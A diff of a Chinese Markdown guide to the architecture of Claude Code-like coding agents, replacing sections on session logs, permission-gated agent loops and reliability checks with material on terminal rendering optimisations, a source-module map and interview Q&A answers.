+   - **对象池与双缓冲区 (Double Buffering)**：为了防止终端渲染字符在快速滚动时闪烁或占用 CPU，系统对终端各字符位置（Cell）和色彩属性（ANSI style）使用了 **Object Pooling** 缓存，内存中计算出差分 Diff 后，采用双缓冲区技术一次性将变化字符刷新到 stdio。
+2. **硬件级局部滚动优化 (DECSTBM Scrolling)**：
+   - 针对长 Transcripts 或代码生成时控制台快速滚动的场景。
+   - 系统不进行全屏 React 组件重绘（重绘极耗 CPU）。而是通过发送标准的 **`DECSTBM`** Terminal Control Sequences（定义控制台硬件滚动区域），让物理终端本身接管上下位移，**CPU 消耗暴降 80% 以上**，在旧款 MacBook 甚至低算力 Docker 容器中也能保持 60 帧极速丝滑。
+3. **Whale 内存防爆监控 (Memory Protector)**：
+   - 针对极端长会话，终端会积压几十万条 React node。
+   - 内置“鲸鱼会话保护器”，实时检测 Node.js 的 RSS 显存和堆内存分配。一旦发现 TUI 树内存逼近 1.5GB（物理上限 30GB+ 的极客环境），自动进行老日志 Node 的**动态剪枝与虚拟化滚动（Virtual Scrolling）**，彻底杜绝 Coding Agent 跑通宵把服务器跑 OOM 的工程尴尬。
 
-```text
-.agent/
-  sessions/
-    sess_abc.jsonl
-    sess_abc.meta.json
-  sidechains/
-    sess_abc.agent_review_001.jsonl
-    sess_abc.agent_review_001.meta.json
-  artifacts/
-    aud_123.stdout.log
-    aud_123.stderr.log
-```
+---
 
-`session.jsonl` 里每行一个事件：
+## 9. 核心源码模块职责对应表 (Key Source Modules)
 
-```json
-{"type":"user_message","ts":"2026-05-15T10:00:00Z","content":"fix failing auth test"}
-{"type":"assistant_tool_use","tool":"Read","input":{"file_path":"auth.test.ts"}}
-{"type":"tool_result","tool":"Read","ok":true,"summary":"120 lines"}
-{"type":"assistant_tool_use","tool":"Edit","input":{"file_path":"auth.ts"}}
-{"type":"permission_decision","decision":"allow","source":"allow_rule"}
-{"type":"tool_result","tool":"Edit","ok":true}
-{"type":"verification","command":"npm test","ok":true}
-```
+在分析其 TS 源码时，可直接对照以下核心模块路径，进行针对性架构借鉴：
 
-优势：
+| 核心源文件路径 | 所属核心子系统 | 承担的物理职责与工程秘密 |
+| :--- | :--- | :--- |
+| `src/QueryEngine.ts` | **Core Agent Layer** | 整个 Agent Loop 的双层状态机入口，管理异步生成器与背压 |
+| `src/tools/BashTool/` | **Safety & Policy Layer** | 包含 18 个核心文件，调用 tree-sitter 对 shell 进行 AST 词法安全扫描 |
+| `src/services/compact/` | **State & Recovery Layer** | 实现 4 层上下文自动压缩、折叠、主动 AutoCompact 与现场重构 |
+| `src/ink/` | **Interface Layer** | 纯 TS Yoga 排版、双缓存对象池、DECSTBM 硬件终端滚动引擎 |
+| `src/utils/swarm/` | **Capability Layer** | 多 Agent Swarm 协作协议、轻量 Explore 节流方案及权限桥接上抛 |
 
-- 易审计：每个动作有时间线。
-- 易恢复：崩溃后读取最后事件继续。
-- 易回放：可以重建 agent 当时看到的上下文。
-- 易隔离：subagent sidechain 不污染 parent transcript。
-- 易调试：线上 badcase 能定位是模型、权限、工具还是上下文问题。
+---
 
-## 11. 可靠性与评测
+## 10. 面试真题与现场口撕 Q&A
 
-`Engineering Pitfalls in AI Coding Tools` 这类论文说明，AI coding tool 的常见问题集中在工具调用、命令执行、API/配置集成等位置。设计时要把验证链路做成一等公民。
+### Q1：为什么像 Claude Code 这样顶尖的 coding Agent 都没有用 LangChain / AutoGen 这样大而全的模型编排状态机框架？
+**💡 满分回答：**
+> “大而全的 Agent 编排框架虽然在 Demo 阶段极其便捷，但在真正的企业级生产环境中，它们往往引入了巨大的黑盒复杂度、多余的上下文开销和不确定的中间状态。
+> 
+> 顶尖的生产 Agent（如 Claude Code）核心的 ReAct loop 实际上非常薄，核心复杂度反而存在于 **Harness（系统工程外壳）**。我们需要自己用最稳妥的 TypeScript 或 Python 协程直接操控 **上下文分段缓存边界、悲观锁、双缓存 TUI 渲染、tree-sitter 词法树安全拦截、以及 4 层的上下文硬收缩策略**。这些极致的工程性能和绝对的安全隔离，是任何高层编排框架都无法完美赋予的。
+> 
+> 因此，‘薄 loop + 厚外壳’、‘LLM 决策 + 代码装配’，是构建高 SLA 生产 Agent 的必然选择。”
 
-| 风险 | 设计兜底 |
-|---|---|
-| 模型误以为完成 | Stop hook 跑测试 / lint / smoke check |
-| 工具调用参数错 | schema + business validation |
-| 命令卡死 | timeout + background session + cancel |
-| 输出太长 | artifact 化 + tail 摘要 |
-| 改错文件 | protected path + ownership + diff review |
-| 多 agent 冲突 | disjoint write set + integration step |
-| 配置漂移 | `.claude/settings.json` / CLAUDE.md 进版本控制 |
-| Prompt injection | 外部内容降权、工具权限独立于模型推理 |
-
-完成判定不要只靠模型自评：
-
-```mermaid
-flowchart LR
-  Agent[Agent says done] --> Tests[Deterministic checks]
-  Tests --> Diff[Diff review]
-  Diff --> Policy[Policy hooks]
-  Policy --> Human[Human acceptance for risky changes]
-  Human --> Done[Done]
-```
-
-## 12. 如果自己实现一个 Claude Code-like Agent
-
-最小架构建议：
-
-```text
-agent/
-  loop.ts                 # while loop / model call / tool result feed
-  context.ts              # CLAUDE.md / history / memory / tool schema loader
-  permissions.ts          # deny / ask / allow / permission modes
-  hooks.ts                # lifecycle hooks
-  tools/
-    read.ts
-    edit.ts
-    bash.ts
-    grep.ts
-    web_fetch.ts
-    agent.ts
-  mcp.ts                  # MCP tool registry
-  storage.ts              # JSONL transcript / metadata
-  compaction.ts           # snip / summarize / artifact references
-  subagents.ts            # isolated sessions
-  eval.ts                 # stop checks / regression eval
-```
-
-核心接口：
-
-```ts
-type ToolProposal = {
-  id: string;
-  name: string;
-  input: unknown;
-};
-
-type PermissionDecision =
-  | { type: "allow"; source: "rule" | "hook" | "human" | "classifier" }
-  | { type: "ask"; reason: string }
-  | { type: "deny"; reason: string };
-
-type ToolResult = {
-  id: string;
-  ok: boolean;
-  summary: string;
-  content?: unknown;
-  errorCode?: string;
-  retryable?: boolean;
-  artifactRefs?: Array<{ type: string; path: string }>;
-};
-```
-
-核心 loop：
-
-```ts
-async function runAgent(session: Session, userInput: string) {
-  await storage.append(session.id, { type: "user_message", content: userInput });
-
-  while (true) {
-    const context = await contextBuilder.build(session);
-    const response = await model.call(context);
-    await storage.append(session.id, { type: "assistant_response", response });
-
-    if (!response.toolCalls.length) {
-      return response.text;
-    }
-
-    for (const call of response.toolCalls) {
-      const decision = await permissions.evaluate(call, session);
-      await storage.append(session.id, { type: "permission_decision", call, decision });
-
-      if (decision.type !== "allow") {
-        await storage.append(session.id, {
-          type: "tool_result",
-          callId: call.id,
-          ok: false,
-          summary: decision.reason,
-        });
-        continue;
-      }
-
-      const result = await tools.execute(call, { timeoutMs: 60_000 });
-      await storage.append(session.id, { type: "tool_result", callId: call.id, result });
-    }
-
-    await compaction.maybeCompact(session);
-  }
-}
-```
-
-## 13. 面试 Q&A
-
-### Q1：Claude Code 最核心的架构是什么？
-
-答：
-
-> 一个薄的 ReAct loop 加一个厚的 agent harness。模型负责推理和提出 tool proposal；系统负责上下文装配、权限、工具执行、审计、压缩、恢复和验证。生产价值主要在 harness，而不是 while loop 本身。
-
-### Q2：为什么不能只靠 prompt 限制模型别乱执行？
-
-答：
-
-> Prompt 是模型输入，权限是系统边界。模型可以被 prompt injection 影响，也可能误判用户意图，所以外部动作必须经过独立的 permission gate、hooks、sandbox 和 human approval。安全策略不能和模型推理在同一层。
-
-### Q3：如何保证 LLM 输出 JSON 正确？
-
-答：
-
-> 分四层：第一，用 structured output / JSON Schema 做生成约束；第二，用 Pydantic/Zod 做解析和类型校验；第三，用业务 registry 做语义校验，例如工具名、节点类型、shot_count；第四，有限 retry 和 fallback。JSON 正确不等于业务正确，业务正确一定要应用层兜底。
-
-### Q4：Claude Code 为什么需要 hooks？
-
-答：
-
-> Hooks 是把 agent 行为接入组织治理的方式。PreToolUse 可以拦危险命令，PostToolUse 可以自动格式化，Stop hook 可以在模型说完成前跑确定性检查，PermissionRequest 可以接企业审批系统。它让 agent loop 不需要硬编码所有组织策略。
-
-### Q5：Subagent 的核心价值是什么？
-
-答：
-
-> 不是并发本身，而是隔离。子 agent 有独立上下文、独立 transcript、可缩窄工具权限，只把 summary 或 patch 返回主会话。这样可以降低上下文污染，也能把复杂任务拆成可审计的局部工作。
-
-### Q6：长任务里最容易坏在哪里？
-
-答：
-
-> 上下文边界、工具输出、权限疲劳和验证缺失。长日志会污染 prompt，多轮历史会牵引模型，用户频繁审批会习惯性点 allow，模型也可能过早宣布完成。所以要有 compaction、artifact refs、auto-check hooks 和最终测试。
-
-## 14. 参考资料
-
-- [Dive into Claude Code: The Design Space of Today's and Future AI Agent Systems](https://arxiv.org/abs/2604.14228)
-- [How Claude Code works](https://code.claude.com/docs/en/how-claude-code-works)
-- [Claude Code overview](https://code.claude.com/docs/en/overview)
-- [Extend Claude Code](https://code.claude.com/docs/en/features-overview)
-- [Configure permissions](https://code.claude.com/docs/en/permissions)
-- [Claude Code settings](https://code.claude.com/docs/en/settings)
-- [Hooks reference](https://code.claude.com/docs/en/hooks)
-- [Hooks guide](https://code.claude.com/docs/en/hooks-guide)
-- [Create custom subagents](https://code.claude.com/docs/en/sub-agents)
-- [Run Claude Code programmatically / headless](https://code.claude.com/docs/en/headless)
-- [Structured outputs](https://platform.claude.com/docs/en/build-with-claude/structured-outputs)
-- [Structured outputs on the Claude Developer Platform](https://claude.com/blog/structured-outputs-on-the-claude-developer-platform)
-- [Claude Code power user tips](https://support.claude.com/en/articles/14554000-claude-code-power-user-tips)
-- [Claude Code power user customization: hooks](https://claude.com/blog/how-to-configure-hooks)
-- [Engineering Pitfalls in AI Coding Tools](https://arxiv.org/abs/2603.20847)
-- [Decoding the Configuration of AI Coding Agents](https://arxiv.org/abs/2511.09268)
-- [learn-claude-code / SourcePulse](https://www.sourcepulse.org/projects/11032055)
+### Q2：当 Agent 会话长达 20 轮、上下文高达 15 万 Tokens 时，执行 Context Compaction（上下文压缩）后，模型经常会忘记当前的编辑位置或刚才讨论的核心规范，你怎么解决？
+**💡 满分回答：**
+> “这在上下文工程中被称为‘压缩失忆症’。我们需要借鉴 Claude Code 的 **Post-Compaction Reconstruction（后压缩重构）** 机制。
+> 
+> 我们的做法是：当触发主动 AutoCompact 提取出结构化的状态摘要后，不能直接带着摘要开始下一轮对话。系统必须在后置层执行一次 **‘现场强注入’**：
+> 1. 重新分析出当前最核心的、正在被模型高频修改的 **Top-5 文件列表**。
+> 2. 将这 5 个文件的当前物理状态（正文/关键修改 diff）再次读取。
+> 3. 伴随着项目的最高级规则文件（如 `CLAUDE.md`）与最新的 user 消息原文，重新强行拼装在压缩后的新 checkpoint 首部。
+> 
+> 这样，我们在物理上抹平了压缩带来的局部信息差，在把上下文窗口暴降 70% 的同时，让模型依然保持 100% 精准的开发视野。”
